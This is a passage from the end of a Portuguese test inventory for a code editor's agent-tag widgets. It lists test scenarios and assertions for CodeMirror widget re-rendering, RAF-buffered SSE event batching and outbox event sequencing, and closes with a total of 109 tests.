- **Cenário:** `widgetA = { agentId: 'critic', status: 'done', lineFrom: 5, lineTo: 10 }`; `widgetB = { agentId: 'critic', status: 'done', lineFrom: 15, lineTo: 20 }`. Chamar `widgetA.eq(widgetB)`.
- **Assert:** Retorna `true`; `lineFrom`/`lineTo` não entram no contrato de `eq()`.

### UX-011 — `AgentTagWidget.eq()` verdadeiro: cursor não perde foco durante stream intenso de tokens
- **Cenário:** Simular stream de 200 eventos SSE em 1s; cursor posicionado na linha 10; `eq()` retorna `true` para todos os widgets inalterados.
- **Assert:** `document.activeElement` permanece no editor; `toDOM()` chamado 0 vezes para widgets sem mudança de `status`.

### UX-012 — `AgentTagWidget.updateDOM()` chamado quando `eq()` retorna `false` (sem `toDOM()`)
- **Cenário:** Widget muda de `status: 'thinking'` para `status: 'done'`; CodeMirror já tem DOM node criado.
- **Assert:** `updateDOM()` chamado uma vez; `toDOM()` não chamado; nó DOM reutilizado e atualizado in-place.

### UX-013 — `AgentTagWidget.toDOM()` chamado apenas na criação inicial
- **Cenário:** Widget inserido pela primeira vez no viewport.
- **Assert:** `toDOM()` chamado exatamente uma vez; retorna `HTMLElement` com `data-agent-id` correto; `cursor: default; user-select: none` aplicados via CSS.

### UX-014 — `AgentTagWidget.destroy()` chamado quando widget sai do viewport (virtualização)
- **Cenário:** Editor com 1000 linhas; scroll para linha 1; widget na linha 900 virtualizado para fora.
- **Assert:** `destroy()` chamado no widget fora do viewport; nenhum memory leak de listeners ou referências DOM.

### UX-015 — Zero re-renders de widgets inalterados durante stream de 500 eventos SSE
- **Cenário:** 10 `AgentTagWidget` no editor; 500 eventos SSE chegam alterando apenas 1 widget; cronometrar execução.
- **Assert:** `toDOM()` chamado apenas 1 vez (criação); `updateDOM()` chamado apenas para o 1 widget alterado; 9 widgets têm `eq() === true` sem DOM mutation; total de DOM mutations ≤ 10 (1 inicial + atualizações do widget alterado).

### UX-016 — `RAFBufferedSSEConsumer`: não chama `setState` diretamente no `onmessage`
- **Cenário:** Inspecionar implementação de `RAFBufferedSSEConsumer`; verificar via code review/teste de integração.
- **Assert:** `onmessage` acumula eventos em buffer; `requestAnimationFrame` dispara o `applyEventBatch()`; nenhum `setState` chamado fora do RAF callback.

### UX-017 — `RAFBufferedSSEConsumer`: lote de >100 eventos dividido em chunks de 100 por frame
- **Cenário:** Injetar 250 eventos simultâneos no buffer; disparar RAF.
- **Assert:** Primeiro frame processa 100 eventos; segundo frame processa 100; terceiro frame processa 50; total: 3 frames RAF para 250 eventos; nenhum frame processa mais de 100.

### UX-018 — `EventSequencer`: `seq_id` persistido no `OutboxEvent` antes da emissão SSE
- **Cenário:** Chamar `persistAndStamp(sessionId, 'AGENT_TOKEN', payload)`.
- **Assert:** `OutboxEvent` criado no DB com `seq_id` monotônico e `epoch_id` correto; evento retornado contém `seq_id` e `epoch_id` no payload; somente então emitido via SSE.

---

*Fim do inventário. Total: **109 testes** mapeados.*
